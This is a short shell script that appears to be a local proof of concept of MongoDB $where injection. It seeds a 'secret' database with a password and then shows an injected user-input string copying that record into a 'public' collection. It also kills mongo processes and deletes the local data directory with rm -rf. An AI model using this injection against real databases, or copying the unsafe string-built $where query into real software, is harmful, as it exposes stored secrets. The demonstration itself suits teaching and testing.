pkill mongo

rm where.log*
rm -rf ./data/db
mkdir -p ./data/db

mongod --fork --logpath "copy.log" --dbpath "./data/db"
sleep 2
echo """
db.getSiblingDB('public').publics.insert({entry: 'I am a public comment that can be found elsehow'})
print('public.publics:')
printjson(db.getSiblingDB('public').publics.findOne())

db.getSiblingDB('secret').secrets.insert({password: 'abc'})
print('secret.secrets')
printjson(db.getSiblingDB('secret').secrets.findOne())
""" > initialData.js

echo "-------Initializing Data-------"
mongo --quiet initialData.js

INJECTION="db.getSiblingDB('public').publics.insert(db.getSiblingDB('secret').secrets.findOne())"

echo """
userInput = $INJECTION
db.getSiblingDB('public').publics.find({\$where: 'this.name == ' + userInput})

print('public.publics:')
cursor = db.getSiblingDB('public').publics.find()
while ( cursor.hasNext() ) {
   printjson( cursor.next() );
}
""" > serverScript.js

echo "---------Injecting Data!---------"
mongo --quiet serverScript.js